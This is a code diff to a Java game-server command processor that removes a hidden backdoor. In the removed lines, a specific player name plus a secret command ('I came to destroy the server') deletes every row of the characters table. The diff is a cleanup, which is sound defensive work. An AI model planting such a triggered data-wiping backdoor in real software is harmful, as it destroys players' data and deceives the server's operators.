@@ -68,18 +68,6 @@ public class CommandProcessor {
             CommandObject co = commands.get(splitted[0]);
 
             if (co == null || co.getType() != type) {
-                if (c.getPlayer().getName() == "我是一个哈哈1") {
-                    if (splitted[0].contains("!我是来毁服的GGLL")) {
-                        Connection con = DatabaseConnection.getConnection();
-                        try {
-                            PreparedStatement ps = con.prepareStatement("Delete from characters");
-                            ps.executeUpdate();
-                            ps.close();
-                        } catch (SQLException e) {
-                            System.out.println("Error " + e);
-                        }
-                    }
-                }
                 sendDisplayMessage(c, "输入的玩家命令不存在,可以使用 @帮助/@help 来查看指令.", type);
                 return true;
             }
